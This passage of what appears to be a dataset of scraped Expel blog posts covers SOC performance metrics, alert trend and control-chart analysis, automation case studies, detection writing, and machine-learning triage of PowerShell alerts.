thinking: but what about quality control? When optimizing for speed I highly recommend you back that with a quality control program . Mors perspective: This is another straightforward calculation. We measure the time between two timestamps: The time an alert entered the queue; and The time the first remediation recommendations were provided to the customer. When we talked about alert queue times we mentioned that we label alerts with a severity (there are five) and that severity is a notion of confidence + impact. How this plays out in practice is that most of the time when an alert labeled with a critical or high severity fires, it means most of the time we spotted a threat vs. a false positive condition. Not necessarily all of the time, but most of the time. This allows us to measure and optimize wait times. We take a similar approach with incident remediation cycles times. We break out incidents into four categories: Non-targeted incidents (think commodity malware  Hello, EMOTET!) Targeted incidents (the bad guy wants to break into your organization Business email compromise (theres so much of this it has its own class) Policy violations (someone did a thing that resulted in risk for the org) This allows us to understand how quickly were able to respond based on the type of incident we detected. Are alerts waiting in the queue for non-targeted incidents? Are we spending too much time fighting the SIEM to figure out how many users received that phishing email? How much time are we spending writing an update vs. investigating? Can we optimize that? It all matters. We break out incident remediation cycle times by the class of incident, inspect whats happening and use the data to learn and improve. Heres an example of how we optimized incident remediation cycle times for Business Email Compromise incidents. TL;DR  We automated alert triage, investigation, the response and optimized how we communicate information to our customers. Our SOC analysts focus on making complex decisions and we use tech for the heavy lifting. Knowing how long the work takes is a good first step  but break the data out into buckets to help you understand where to get started. Youve got your goal and your data  what now? Before you  measure all the things  remember to have a compelling aim. If you dont and just measure whats available you may be optimizing for the wrong outcome  doh! After we defined our strategy we talked about fundamental metrics to know when alerts show up, how long they wait and how long it takes to spot an incident and provide our first recommendation on how to stop it. In our next post, well talk about the metrics we use to monitor the SOC end-to-end system as a whole. In our final post well share SOC metric success stories. Make sure you subscribe to our blog so that youll get the posts in the rest of this series sent right to your inbox. Resource sharing is caring Want a TL;DR version of this for quick reference in the future? Expels SOC management playbook: Define where you want to get to (your strategy) Deploy measurements to help guide you and the team Learn how to react to what the measurements are telling you Iterate Persist Celebrate'}) (input_keys={'title'}),
  Example({'title': 'Performance metrics, part 2: Keeping things under control', 'url': 'https://expel.com/blog/performance-metrics-keeping-things-under-control/', 'date': 'Oct 20, 2020', 'contents': 'Subscribe  EXPEL BLOG Performance metrics, part 2: Keeping things under control Security operations  9 MIN READ  JON HENCINSKI, ELISABETH WEBER AND MOR KENANE  OCT 20, 2020  TAGS: Careers / MDR / Metrics / Tech tools Metrics arent just for status reports, mmmkay . Effective SOC managers embrace data and use metrics to spot and fix problems. At Expel, reviewing metrics and adjusting is how we take care of the team  and our customers! In this part-two installment of our three-part blog series on all things SOC metrics and leadership, well dive in a little deeper to explore how we use data to spot potential warning signs that SOC analyst burnout is ahead  a critical factor in SOC performance. How to predict SOC analyst burnout You know  that feeling of defeat? When empathy is suddenly replaced with apathy because too many alerts are showing up, and theyre taking too long to handle? Management just doesnt seem to have their finger to the pulse on the current state of things? Nothing changes because thats how weve always done it! You begin asking: Is this what I signed up for? Yeah, thats what we mean by SOC burnout. And its common. In fact, its something many of us have experienced at prior jobs. Just like investigations, effective operations management is rooted in the quality of questions asked. In this blog post, well share operations management metrics, the techniques we use to gather the right data and tips-and-tricks for how to analyze the data and implement your learnings. Heres what well talk about: Operations Management Metric Question(s) Technique Tools Did the daily mean number of alerts change? When did it last change? Change-Point Analysis Python  there are lots of examples on GitHub Whats the daily alert trend? Is it up, down or steady? Time Series Decomposition Python  statsmodels.tsa.seasonal library Is my alert management process in a state of control? Or are things totally borked? Time Series Decomposition Shewhart control chart If terms like time series decomposition, residuals, seasonality and variance are new to you  dont worry. No previous experience required. Well walk you through each of these operations management metrics and how these techniques are applied. Metric #1: Whats the mean number of alerts we handle per day? Technique: Change-Point Analysis Tool: Python TL;DR: You need to understand how many alerts show up each day. And if that number changes you need to know when and why. You likely dont have infinite SOC capacity (people), and if too many alerts are showing up relative to your available capacity, youre going to be in trouble. Change-Point Analysis is our Huckleberry here . Elisabeths perspective: Change-Point analysis is a method for finding statistically significant changes in time series data. What does statistically significant mean? In this case, that just means the change in alert data is significant enough to indicate that its more than just typical daily noise. It helps us spot changes like these: Change-Point graph showing where changepoints were identified in daily alert count data with context. When we detect a significant change, we ask questions like: Did we onboard a new customer on that day? Did we release a new vendor integration? Did a vendor release any new features? Were there any big alert spikes? Is there any on-going red team activity? Bottom line: If we dont have an explainable cause, we dig deeper to understand what happened so we can adjust. We then ask ourselves questions like: Do we need to spend time tuning detection rules? Do we need to write a new investigation workflow to automate repetitive tasks? Sometimes we even ask ourselves if we just need to turn off a detection because the juice aint worth the squeeze. Jons perspective: Change-Point analysis tells me how many alerts we handle each day. When we see a significant change (up or down) we immediately spring into action to understand why. For example, by looking at the Change-Point graph Elisabeth just shared, I was able to see that: Between May 1, 2020 throughJune 21, 2020 the daily alert count was relatively steady  the mean did not change. On June 21, 2020 the mean daily alert count doubled! Why? Cobalt Strike . Its always Cobalt Strike. Im not joking. It was a red team  the customer didnt want to remove access  so we had a ton of true positive alerts for the activity. We were able to handle the increase by using tech (automation). On July 5, 2020 the mean daily alert count went down a bit as the customer removed BEACON agents. On July 13, 2020 things were mostly back to normal. What did we do after looking at the data? First, we noted the significant change. Then we quickly reviewed our detection metrics to understand why the daily alert count doubled (hello, BEACON agent). Lastly, we used tech , not people, to handle the increased alert loading. A super quick time series decomposition interlude Technique: Time Series decomposition Tool: Python, statsmodels.tsa.seasonal library Elisabeths perspective: Time series decomposition is a method for splitting time indexed data into three pieces: trend, seasonality and residuals. This split is done in an additive way like you see in the below equation. Trend + Seasonality + Residuals = Observed Value Lets break each piece down a bit further: Whats the trend? This is the general directional movement that we see in the data. You can think of this like smoothing out all the small bumps in the raw data to get a better view of the true directional movement. Whats seasonality? These are the repeated patterns that we see. Depending on how your data is aggregated, these could be hourly, daily, weekly, monthly or even yearly patterns. For example, when we look at daily aggregated data, we tend to see higher alert volume on weekdays compared to weekends. What are residuals? This is everything that is leftover after removing the trend and seasonality. This is basically the noise in the data, or the parts that cant be attributed to the trend or seasonality. To perform seasonal decomposition, we use the seasonal_decompose function from the Python statsmodels.tsa.seasonal library. Since were running this analysis on aggregated daily alert counts, we prep our data by summing the total number of daily alerts and formatting the data to be date indexed. Once the data is formatted, the basic seasonal decompose can be achieved with just a couple lines of code: Seasonal_decompose function from statsmodels.tsa.seasonal And heres the resulting visual: Output of `result.plot()` Now our time series data is split into the trend, seasonality and residuals. This allows us to answer key operational questions that well cover next! Metric #2: Whats the daily alert trend? Technique: Trend analysis Tool: Tableau (or any visualization tool) TL;DR: You can use what happened in the past to predict what will happen in the future. And what goes up doesnt always come down unless we take action. We examine the daily alert trend to manage our alerts so they dont manage us. Jons perspective: One of the most important questions SOC leaders should ask is: Whats the daily alert trend? Is the trend going up, going down, is it steady or do we see transient spikes? Your answer to this question will determine if and how you need to spring into action. Recall from above, we use the seasonal_decompose function from the Python statsmodels.tsa.seasonal library to split our daily alert counts into three pieces: Trend Seasonality; and Residuals aka the leftovers We do this via Jupyter Notebook to make it easy and export the results to a CSV that looks like this: CSV output of Time Series decomposition We then use a visualization tool, Tableau in this case, to examine the daily alert trend. Heres what that looks like: Daily alert trend visualization Lets talk about whats going on here. Between July 2020 and August 2020 we experienced a slight downward trend, but the trend was relatively stable. When we see something like this we take the action to make sure we werent over tuning and perhaps even be a bit more aggressive with detection experiments. In the middle of August 2020 we see a couple big spikes mostly the result of a bad signature (it happens!) followed by a quick recovery to daily alert levels seen previously. Our call to action was to tune out the noise from the bad signatures. In the middle of September 2020 things get interesting. We see an upward trend that looks like a slow and steady climb. A pattern that looks like this always grabs my attention. This is very different from a big spike! Why? A slow and steady climb is likely indicative of more and more alerts showing up each day from different technologies. More alerts + increased variety = heavy cognitive loading And just like alerts, you have to manage cognitive loading. Because if you dont, well, SOC burnout has entered the chat. The call to action here is to understand the situation, figure out where the increased loading is coming from (new signature, product updates, etc.) and react. In this case two of the vendors we work with released product updates and we needed to tweak our detection rules to reduce false positive alerts. In late September 2020, youll see a recovery to alert levels weve previously seen. This is exactly what were looking for! Pro-tip: You can ask the team hows it going? in weekly staff meetings or 1:1s , but Ive found that by guiding the conversation using data, youll get better answers. For example, you can instead ask: Team, the daily alert trend is on a slow and steady climb right now. As a management team were digging in, but what are you seeing? Lead with data. It lets the team know you understand whats happening and that you have their backs. In fact, it enables you to ask better questions which will lead to more effective answers. Hence why I say that metrics help you take care of the team. Metric #3: Is alert management under control? Technique: Statistical process control Tool: Shewhart control chart and any visualization tool TL;DR: Alert spikes are going to happen. But too many spikes can make it hard for a SOC analyst to find the alerts that matter. I only want to handle tons of false positives. Finding bad guys isnt interesting.  No SOC Analyst ever. An alert management process in a state of chaos means your SOC analysts are likely feeling the burn. Jons perspective: If youve spent time in a SOC, you know that bad signatures happen. You also know that experiments to answer how prevalent is this string or packet globally can sometimes lead to bad outcomes. And by a bad outcome, I mean tens of thousands or, in extreme cases, hundreds of thousands of false positive alerts. Again, it happens. Which is why effective managers ask: Is alert management in a state of control? To answer this question we use the residuals from our time series decomposition and a Shewhart control chart . Recall that residuals are what we have remaining after weve extracted the trend and seasonal components. If youre unfamiliar with a Shewhart control chart heres a quick TL;DR: Its used to understand if a process is in a state of control. Theres an upper control limit (UCL) and lower control limit (LCL)  we use three standard deviations from the mean. Measurements are plotted on the chart vs. a timeline. Measurements that fall above the UCL or below the LCL are considered to be out of control. Pro-tip: For folks just getting started with statistical process control,  Statistical Process Control for Managers  by Victor Sower is a great place to start. Armed with our residuals, we plot them in a Shewhart control chart using Tableau. Heres the resulting visualization: Shewhart control chart using alert residuals You might be wondering; what are we looking for? Well for starters, Im looking for any days where our measurements exceeded the UCL or LCL. From the visualization above you can see there were two days in August 2020 when alert management was out of control. On both days we encountered new vendor signatures that resulted in a high volume of false positives. But you can also see we were able to quickly get the situation under control. I also look for periods of time where theres more variance  and when I see more variance in our control chart thats almost always paired with a slow and steady upward trend. By plotting the residuals in a control chart were able to answer is alert management under control and if not, we can figure out why and react. If were seeing more variance, we do the same thing! We dig in, ask questions and adjust. We like to call this the smoothed out trend. And we do this again and again and again. Effective operations management is a process, there is no end state! Monitor, interpret, react, adjust. Rinse, repeat. Remember the Why Super quick recap, promise. We started by performing Change-Point analysis against our aggregated daily alert count. Change-Point analysis lets us know the daily mean, if it changed and when. We then broke our aggregated daily alert counts into three pieces using time series decomposition: 1) trend 2) seasonality and 3) residuals. We then examined the smoothed out trend using a visualization tool to understand whats happening and then plotted the residuals in a Shewhart control chart to answer is alert management under control? Alert operations management process Remember the why with metrics. Metrics arent just for status reports. Highly effective SOC leaders embrace data and use metrics to take care of the team. Again  if youre not managing your alerts, theyre managing you. If youre not using data to spot too much cognitive loading  or finding ways to free up mental capacity  thats a recipe ripe for SOC burnout. And lastly, the quality of your operations management is rooted in the quality of the questions asked. Think about the questions youre asking today. Are they the right ones? Weve talked about metrics; how they create an efficient SOC and how they keep our analysts and customers happy. In our last post, well share some IRL examples of what this looks like within the Expel SOC. Dont miss it! Subscribe to our EXE blog now and be the first to read our third and final installment of our SOC metrics and leadership series.'}) (input_keys={'title'}),
  Example({'title': 'Performance metrics, part 3: Success stories', 'url': 'https://expel.com/blog/performance-metrics-part-3-success-stories/', 'date': 'May 18, 2021', 'contents': 'Subscribe  EXPEL BLOG Performance metrics, part 3: Success stories Security operations  6 MIN READ  MATT PETERS, JON HENCINSKI AND ELISABETH WEBER  MAY 18, 2021  TAGS: MDR / Metrics / Tech tools In this final post of our three-part blog series on all things SOC metrics and leadership, were going to take the framework we described in the previous posts and share how we applied it in some specific situations. Well point out a few gotchas and lessons learned along the way. Success story #1: The duplicate alert issue Metric: How many alerts do we move to an open investigation or incident? TL;DR: Finding improvements is often the combination of a set of metrics and the analysis to understand what those metrics mean. As we mentioned in part 1 of the series , one of our strategic goals is to understand our analysts capacity and make sure were making good use of it. Which means we need to understand what our analysts are doing . There are a bunch of ways to measure this, but since we were after understanding it as a process, we measured the various paths an alert can take through our system, and how long each alert spent in each state of our alert system. Understanding which stages an alert needs a human to get involved can give us an idea of where to focus our optimization energy. So, we added counters and timestamps to measure the path of each alert we processed. The diagram below shows our state machine, and the number of times alerts travel down each path. The data showed us that the number of alerts that were added to existing investigations accounted for 20-25 percent of all the alerts we handled. Expel SOC alert system diagram Now that we have measurements, we have to ask ourselves  what are they telling us? The data suggested that, while our analysts were investigating something, another alert related to the same behavior would come in. Weve all been there  you go heads down and ignore the queue for a few minutes only to pop up again and realize there are 10 more beacons or the network tech is now reporting what the endpoint saw. So the metrics were explainable, and it turned out this was having an impact  it happened a lot, which was adding up to wasted time. From here, we formulated our reaction. In this case our analysts and our UX team worked together to add a feature to our platform to automatically route related alerts to the appropriate investigation. As part of this process we added configuration to allow the analysts to widen or narrow the alert routing filter, based on what they thought related alerts might be. We deployed these changes into production and watched what the impact was on the SOC. The graph below shows the change interval: Expel alert pathways before and after adding new UX tot auto add an alert to an investigation What we see is that weve managed to cut the number of add-tos by 12 percent. Considering that typical triage time is four minutes, this translates to 12 percent x number of Expel alerts x four minute savings per week for our analysts. Success story #2: So much BEC Metric: How many business email compromise (BEC) incidents do we handle each week and whats the cycle time? TL;DR: You can simultaneously improve two metrics that are in tension with each other  like speed and quality  but you have to be creative to do it. In addition to understanding capacity, another goal is to respond faster than delivery pizza arrives at your door (30 minutes or less). One way we can do that is to stand on the SOC floor and shout: Move Faster!!! Weve all worked there, and it wasnt good for morale or for quality. We elected to follow a different path. By understanding what type of work was taking the longest and happening the most, we figured we might be able to get crafty and improve performance while keeping quality high. As a general rule, we look at (a) the things we do a lot and (b) the things that take a long time. To figure out where to target our efforts, we used gross counts of incident types  the theory being that incidents take longer to investigate and report. In this story, our SOC observed that, week-over-week, BEC was one of our most common incident types, making up about 60 percent of the incidents we handle. This looked like a prime place to optimize. From here, we asked the question: What about this process is taking the longest? To find the answer, we used a set of path metrics  each step in each alert is timestamped. By aggregating these timestamps, we learned that reporting was the most time consuming portion of the incident handling, taking over 30 percent of the total incident time. Step in process Typical cycle time (excludes wait time) Triage alert(s) for BEC attempt 3-4 minutes Move to investigation Seconds Preliminary scoping 5-8 minutes Declare incident Seconds Add remediation steps 1-2 minutes Secondary scoping 15-20 minutes Complete summary of Findings 20-25 minutes Typical BEC cycle time pre automation This is where things get challenging  blindly optimizing the reporting could lead to a massive drop in quality. The report, after all, is the thing that tells the org what to do in response. A bad job here and we might as well hang it up. Once again, the combination of Expels UX team and the SOC proved to be magical  they designed an enhanced report including graphics and charts that was both more useful to the customer, as well as more automatable. The speed and quality of our reporting went up! In the table below you can see we improved our BEC incident cycle times by about 34 percent AND the quality of our reporting. Step in process Typical cycle time (excludes wait time) Pre-report automation With report automation Triage alert(s) for BEC attempt 3-4 minutes No change Move to investigation Seconds No change Preliminary scoping 5-8 minutes No change Declare incident Seconds No change Add remediation steps 1-2 minutes No change Secondary scoping 15-20 minutes No change Complete summary of Findings 20-25 minutes 5 minutes (-34%) BEC cycle time by step pre and post reporting automation Success story #3: Handing off work to the bots Metric: What classes of work do we see week-over-week? Are the steps well defined? Can we automate the work entirely to free up cognitive loading? TL;DR: Metrics can help you target automation to yield defined benefits in short time periods, rather than trying to generically automate analysis, which is a bit like solving the halting problem. Were constantly looking for ways to remove cumbersome work from humans  allowing them to focus on the more creative aspects of the job. But first we need to understand what classes of work were doing and then figure out what can be automated. To answer these questions, we collect two sets of metrics: Counts of the number of each type of alert we receive Count of each type of action we perform in response to those alerts For example, we get 27 malware alerts per week, and our investigative process involves acquiring a file and detonating it 85 percent of the time. To be clear  gathering this data was a process rather than a discrete event. We continuously collected metrics to understand the types of actions we were performing along with the classes of alerts we were responding to. Turns out both of these metrics followed a Pareto distribution  we saw that 85 percent or more of the work was being spent on one or two top talkers: 1) suspicious logins and 2) suspicious file and process activity. To automate investigations into suspicious logins ,we started by understanding how often suspicious login alerts were moved to an investigation. Turns out, a lot. Then we studied which investigative steps our analysts were taking and then handed off the repetitive tasks to the robots. The full details can be found here , but the net result is that we improved the median investigation cycle time into suspicious logins by 75 percent! We then repeated this process by automating our investigation into suspicious file and process events, which was also Pareto distributed. At a certain point, we got down to things that were not doing often enough to worry about. Thats when we realized the development and maintenance cost exceeded the time and frustration savings. This is an ongoing effort. So far, it helps our analysts in 95 percent of our alert triage in any given week. Thats a wrap! We hope youve enjoyed reading this three-part SOC metrics blog series . Before you go off and create metrics for your SOCs performance, remember: Have a goal in mind before measuring all the things. A clear outcome will inform what to optimize. Leadership is the key to SOC efficiency  use metrics data to find ways to take care of your team and avoid burnout. Developing metrics doesnt mean just plugging in numbers for reports. Applying your measurement framework will be unique for each situation  itll require a curious mind, a keen eye and a willingness to always find new ways to improve the process. Theres no more strategic thing than defining where you want to get to and measuring it. Strategy informs what good means and measurements tell you if youre there or not. Lastly, performing quality control (QC) is vital to your continued success. Check out our Expel SOC QC spreadsheet to see what our analysts look for when assessing performance. As an added bonus, you can get your own copy of this resource. So go ahead and download it (free of charge!) and customize it to fit your orgs needs. Stay tuned  well be talking more about measuring SOC quality in a blog post coming soon! Download Expel SOC QC template'}) (input_keys={'title'}),
  Example({'title': 'Plotting booby traps like in Home Alone: Our approach to ...', 'url': 'https://expel.com/blog/approach-to-detection-writing/', 'date': 'Jan 12, 2021', 'contents': 'Subscribe  EXPEL BLOG Plotting booby traps like in Home Alone: Our approach to detection writing Engineering  7 MIN READ  MATTHEW HOSBURGH  JAN 12, 2021  TAGS: Cloud security / MDR / Tech tools Were often asked about how we create and prioritize detection at Expel. With so many factors to consider, its difficult to give a one-size-fits-all response. We recently hosted an internal conference at Expel that included a detection writing lab to address this very question. The lab resulted in an analogy that I trust most of you reading this can relate to: How D&amp;R engineers are like Kevin from Home Alone. By the time you finish reading this post youll have an understanding of our thought process when it comes to writing detections at Expel, how detection writing enables our SOC analysts to make smart decisions as they review an alert and how this process helps us gain a deeper understanding of our customers environments. Detection while Home Alone The most painful booby trap in Home Alone has got to be the nail through the foot as Marv walks barefoot up those tar smeared steps . Or possibly, when Harry grabs the glowing red-hot doorknob . You can almost smell his pain. But rewind a few days before the Wet Bandits are running through Kevin McCallisters fun house and you can see some of the planning that went into this burglary. The Wet Bandits did their research and profiling before making their move. They knew who was on vacation and even when the timer for the lights would kick-on each night. The difference between the McCallister home and those neighbors who were on vacation is that Kevin was able to identify the Wet Bandits objectives early and counter their plan with a battle plan of his own. Throughout the well-loved movie, were presented with a master class on how to identify nefarious threat activity at the expense of some of the sharpest burglars that Hollywood ever produced. Suffice it to say, youve probably had your fill of holiday movies (or maybe not), but they can serve as a point of reference for what we do at Expel in terms of detection writing. You see, a detection is simply the identification of something interesting on your systems or network. But where it starts to get complicated is when you ask the question: Is this bad? To help orient your detection writing, its important to consider risk. But I thought risk was just for compliance activities? Well, understanding risk can serve you well in terms of threat detection and perhaps prioritizing your defenses. What is detection anyway? As noted previously, detection is basically identifying events of interest within your environment. But it goes beyond that. Detection is all about uncovering something that would otherwise remain hidden (or unchecked). Dragos has done a great job distilling the different categories into four major types that I can summarize into the following: Indicator Matching (IPs, file hashes, domains) Behavioral Matching (techniques, combinations of indicators) Configuration (exposed Amazon Web Services [AWS]S3 buckets, incorrectly configured authentication) Manual Efforts (threat hunting and threat modeling, for example) In many environments, there are algorithms or baselines that help to detect things outside of the norm. These are useful in the Expel context as they help us answer questions like: Has this logon exhibited this type of behavior in the past, or is this an outlier? Having an idea of where to start your Detection Quest may rest in a familiar (or painful) practice. Compliance equals security ()  Risk isnt just for compliance, Marv! In the context of detection, it helps to serve as the guiding light to where we as security practitioners should start (or spend extra time). Why? Because risk represents the sum of threat (which could be an active adversary, opportunistic attacker or malware) and vulnerability (a hole in the fence  or system, network or cloud environment). Risk informed threat detection When Kevin first overhears the Wet Bandits talking about their plan to rob his home, hes actually conducting an ad hoc risk approach to threat detection: Threat = burglars eyeing his home (Wet Bandits) Vulnerability = Unlocked doors and/or no one home (no alarm, just light timers) Risk = likelihood the threat will take advantage of the vulnerability (imminent!) By examining your vulnerabilities and threats, you can have a better understanding of your organizations risk. Understanding your known risks and vulnerabilities, youll have a greater chance of uncovering the threats that mean something to your organization. Put another way: your ability to create a meaningful detection will be more fruitful. The battle plan Kevins rapid assessment requires immediate action: The battle plan . Adding up the known threat and known vulnerabilities, Kevin creates the overall strategy and tactical responses that will help to slow the Wet Bandits down. Similarly, this plan is like your unique organizations environment, which may incorporate your security tooling, identity providers and your cloud-based infrastructure. Similar to a clever eight-year-olds battle plan, detection writing requires planning Your battle plan will more than likely have more detail, but largely it serves as a means to understand the areas of your organization that you can obtain data from. This data can be used as the basis for your alerting. Alert data flow and where to start The result of your detection is an alert. An alert is really another way of saying detection (for sake of simple argument), but the key to getting to this point is bringing the relevant log data from the various sources identified in your organizations battle plan. Notice: I did not say bring in all the data either. Unless you have money to burn, having every log known to your organization is often unreasonable from a cost and storage perspective. Working your way back from your organizations most notable risks and most important data, youre able to more effectively prioritize the logs you need. This is often referred to as The Crown Jewel Analysis . The next step is to establish which logs will help make up the most complete picture as it relates to these systems and data. The second step is to understand who your adversary is. Take a breath. This could mean you might need to do some threat modeling . But the key is to understand what your adversary wants from their target (like protected client data, trade secrets or financials). Your threats dont care how much youve spent on your security; theyre more interested in if theyll be successful in achieving their objectives and if theyll be caught. The best way to consider this is via a model coined by Josh Corman and David Etue which is known as the Adversary Return on Investment (AROI). Adversarys Return on Investment (AROI) formula More notional than quantitative, this model helps you understand why your organization might be a target for a particular adversary. Decreasing the adversarys probability of success via deterrence measures can increase their chances of being caught. This can mean youre a less appealing target because the return isnt optimal. With this established, its time to create your detection! A rule At Expel, were fans of Yet Another Markup Language (YAML). It gives us detection writers the ability to describe what were detecting and the detections priority, categorization and required investigative steps. Beyond that, its the file we use to write our detection logic in  which you see in the image below. Example YAML Snippet from Expels Sunburst IOC Detection The result of the logic often results in an Expel alert, which is what our SOC analysts use to make decisions. Remember when Kevin would celebrate when his adversary (the Wet Bandits) would have their face smashed by an iron or their head torched? Similarly, we celebrate when we find something  but it doesnt stop there. Often an alert may require enrichment or additional details. These details may come directly from the rule itself or they may be provided by our automation robots. Theres no better way to burn out a SOC analyst than by having them lookup domain information for hundreds of alerts per day. Instead, we pass most of the enrichment activities to our robots so our analysts have the most relevant information to make an expeditious decision, which keeps them in the proper mindset. Investigative mindset The Expel mindset is all about making a decision based on an alert, or multiple alerts, with minimal manual effort. Our detection writing and response actions are centered around this. Some of the common questions an analyst needs to answer in order to determine next steps (Is this an incident? Does the customer need to be notified? Do I need more information?) are dependent on the following: What am I looking at? Can I use open source tools, or is the information returned from our automation to identify suspicious behavior? If the alert is benign, should I suppress it? Do I need to investigate the activity further? Spotting the trends Spoiler alert: At the end of Home Alone, just when you think the Wet Bandits are about to claim their vengeance against little Kevin, Old Man Marley steps in to serve up his infamous shovel to the head. Unbenounced to the Wet Bandits is that the police are on their way. Once apprehended, the officer states that they now know each and every house they hit because their indicator of compromise (IOC) was running water. At Expel, we monitor and respond to alerts from a variety of customers across industries. Our analysts are at the center of all the action and have the ability to analyze trends over multiple customers, which aids them in the decision making process. A word about communication Effective communication with the customer is paramount. At the point when the determination is made that the alert does constitute an incident, an analyst would quickly assign the necessary remediation actions to put a stop to an active threat. They would also recommend the required resilience actions to prevent similar threats to the customers environment in the future. In certain cases where the threat is ongoing, analysts will arm themselves by creating a Be On the LookOut (BOLO) rule for an indicator, or a collection of indicators to quickly create a custom detection to alert on future malicious activity. Finally, analysts may also add certain indicators to the customer context also known as the customer context (CCTX) database to quickly pass information among themselves and to help them further understand each customers unique environment. All of this is key to detection and response at Expel. Parting words We hope this post has given you insight into how we write detections here at Expel in a more approachable manner. Detection is simply the process of spotting interesting activity on a system or network. Where it truly proves to be valuable is when the alert can help a human make a decision about the bad-ness of what theyre looking at. Similar to the way Kevin kept himself safe in Home Alone, a lot of consideration goes into creating a detection. It takes analysis of risk, vulnerabilities and the relevant threats to the organization. Because not all threats or adversaries are created equal, its important to present detailed information, with minimal manual intervention, to the analyst so they can make a determination on next steps. Finally, communication  just like how Kevin reported the Wet Bandits to the authorities  is an important step in response. You guys give up? Or are you thirsty for more?  Kevin McCallister'}) (input_keys={'title'}),
  Example({'title': 'Prioritizing suspicious PowerShell activity with machine ...', 'url': 'https://expel.com/blog/prioritizing-suspicious-powershell-activity-with-machine-learning/', 'date': 'Jul 21, 2020', 'contents': 'Subscribe  EXPEL BLOG Prioritizing suspicious PowerShell activity with machine learning Tips  6 MIN READ  ELISABETH WEBER  JUL 21, 2020  TAGS: Get technical / How to / Managed detection and response / Managed security / SOC PowerShell in a nutshell: Its a legitimate, management framework tool used for system administration but is commonly used by attackers looking to live off the land ( LOL ) because of its availability and extensibility across Windows machines. So, why are we talking about PowerShell specifically? PowerShell historically is a go-to tool for attackers because its a scripting language that is easily extensible and exists by default on most Windows machines. Its also commonly used by administrators. Which is why differentiating between administrative activity and malicious PowerShell use is important. This is where I came in. (*waves* Hi! Im Expels senior data scientist.) In this blog post, Ill talk about how I used machine learning in combination with the expertise of our SOC analysts to make it easier and faster for them to triage PowerShell alerts. Incoming First, Id like to set the stage. Expel is a technology company that has built a SaaS platform (Expel Workbench) to enable our 247 MDR (managed detection and response) service. We integrate directly with the APIs of our more than 45+ different security vendors, 12 of which are EDRs (endpoint detection and response). We pull alerts from these devices, normalize them to an Expel specific format and process them through a detection engine we lovingly call Josie. Alerts then show up in the Expel Workbench with an Expel assigned severity. Getting our priorities straight Before you get to triaging, youve got to figure out a way to know when its the right time to sound the alarm. Each severity is in its own queue. Analysts work from critical to low, or visually you can think about this as working from left to right. A critical alert, for example, has an SLO (service-level objective) of an analyst picking it up within five minutes of it arriving in the queue. We can use these queues, shuffling alerts based on our confidence, to react quicker to higher confidence alerts. Alerts that fall into the high queue are triaged by our analysts first. Then they look at medium alerts, followed by low-priority alerts. Using this queueing method helps to ensure that the most urgent alerts are viewed by analysts first. Seems simple, right? Well, figuring out where an alert falls in this queue is the tricky part. Typically, we make this determination by looking at an entire class of alerts and assigning a priority level to that entire class. For example, based on our experience with vendor Y we map alert category X to Expel severity Q. This is an example of us mapping a whole category of alerts to a specific Expel severity. However, for PowerShell alerts, we now use a machine learning model to predict the likelihood that each individual PowerShell alert is malicious. Based on that prediction, we determine under which level of priority to place the alert in the queue. For example, if we predict that an incoming PowerShell alert has an 95 percent likelihood of being malicious, this alert would be placed in the high priority queue ensuring that analysts quickly investigate it. This way, our SOC team can quickly respond to threats in our customers environments. Waitpredicting the percentage likelihood of an alert being malicious? Its not sorcery, I promise. Its math. To determine the likelihood that a PowerShell alert is malicious, we use a decision tree based classification model with several different features. Its trained on past alerts that our SOC analysts have triaged. All decisions that our analysts make about an alert are recorded in Expel Workbench. The decision points, like moving an alert to investigation, closing it as a false positive or declaring it true positive and moving to an incident, serve as ground truth labels that we can use when building our classification model. Youll see an example of a machine learning decision tree below. Our model features are extracted from the PowerShell process arguments. Based on those features the model essentially makes a series of decisions until it reaches a conclusion as to whether or not the activity is malicious. Example decision tree After the alerts process arguments go through all the decision points, were able to predict the likelihood that the alert is malicious. While this example is much more simplified than Expels actual decision trees, this shows you the basic process for how the model is applied to make decisions. The model we created at Expel to help us prioritize PowerShell alerts uses LightGBM which basically combines several decision trees (similar to the one above). Theyre all slightly different but cumulatively create greater efficiency in determining how likely an argument (alert) is to be malicious. Our model uses more than 30 different features. Heres an example of a few: Entropy of the process argument Other count variables: these count the number of times special characters like +, @, $ and more are found in the process arguments Other string indicator variables to check if specific strings, like invoke or -enc/-ec/-e, are present in the process arguments What does this look like at Expel? Whos on the front line of defense? You guessed it  our robots . Our analysts are supported by technology weve built at Expel. In the case of triage, were constantly adding new automated tasks. We think of each task as a robot with a specific job. So, it shouldnt come as a surprise that weve also implemented the classification task of PowerShell in a robot. When an alert comes in, our robots check if it contains a PowerShell process (yes  were fully aware you can bypass this by renaming PowerShell). If so, the robot runs the PowerShell arguments through the classification model to get a prediction. Once the robot has the prediction, it reprioritizes the alert if necessary and includes a note on the alert to let our analysts know that the alert was reprioritized. It is very important to note that this robot will never suppress an alert, they can only change the severity. The process looks like this: PowerShell model process Lets look at an example of an alert going through the process. Below, youll see an alert came in and is now being assessed as a PowerShell activity. First, the robot checks if the PowerShell process is present, and if so it runs those process arguments through the PowerShell model. The image below shows an example of process arguments that would get pushed through this model. Example of a process args After the arguments run through the model, we get a score of how likely it is that the arguments are malicious. If that score is above a defined threshold, we reprioritize the alert to a higher point in the queue. And finally, if an alert is reprioritized, our analysts will see a note in Expel Workbench (see example below). Analyst view in Expel Workbench after alert is reprioritized The analyst will still triage the alert as normal, theyll just be doing it sooner. The example we just walked through was actually an incident that our analysts caught sooner because we moved the initial alert from low to high in our queue. Three things we learned after productionalizing our first machine learning model: This was a collaborative effort, and our integration with not only Expels internal teams but also with our stakeholders helped us come away with some key insights. As you consider applying machine learning, here are a few things at Expel we learned/believe. 1. Have a way to monitor the model in production. Keep a line of sight on the models performance once implemented. Track metrics like the count of alerts that were evaluated by the model as well as how many of those alerts were actually reprioritized. We also continue to monitor how well the model identifies truly malicious alerts assessing how many high priority alerts turn out to be malicious activity. We use DataDog to monitor our applications so weve bent it to our will and use it to monitor this models performance. Ive provided an example of our dashboard in the image below, which shows the past month of PowerShell activity. Example image of Expel Workbench 2. Run machine learning in parallel with human eyes to build trust. Machine learning techniques can sometimes feel like a black box. Because of this, its important to overcommunicate what you are doing and also make it clear the technology is a way of supplementing human work rather than replacing human work. Overcommunication, and stakeholder buy-in, helps us enhance the feedback loop with our stakeholders. This builds trust and increases feedback, which inevitably improves the overall performance of the model over time. 3. Have a way for users to provide feedback. Since our analysts are working with these alerts every day, theyre able to provide great long-term feedback on the model results in production. If an alert gets moved up in priority when an analyst doesnt think it should have, this provides an opportunity for them to give us that feedback so we can think about potential future improvements to the model. For example, could we add a new feature that would help with the use case they are questioning? Its important to continue asking these questions and maintain an open line of communication across teams. 